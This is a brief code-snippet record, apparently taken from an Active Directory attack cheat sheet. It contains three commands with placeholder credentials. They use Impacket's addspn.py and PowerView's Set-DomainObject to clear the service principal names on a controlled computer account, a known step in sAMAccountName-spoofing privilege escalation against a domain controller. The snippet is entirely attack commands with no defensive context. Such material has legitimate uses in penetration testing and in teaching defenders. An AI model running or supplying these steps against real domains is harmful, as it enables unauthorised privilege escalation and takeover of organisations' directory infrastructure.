---
id: e60b8c1b-6a96-40a7-93ca-83fd96e60ddd
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:03.096343+00:00'
updated_at: '2023-04-10T20:26:11.554516+00:00'
---

# Code Snippet e60b8c1b

**Language**: ps1

```ps1
impacket@linux> addspn.py -u 'domain\user' -p 'password' -t 'ControlledComputer$' -c DomainController

powershell@windows> . .\Powerview.ps1
powershell@windows> Set-DomainObject "CN=ControlledComputer,CN=Computers,DC=domain,DC=local" -Clear 'serviceprincipalname' -Verbose
```


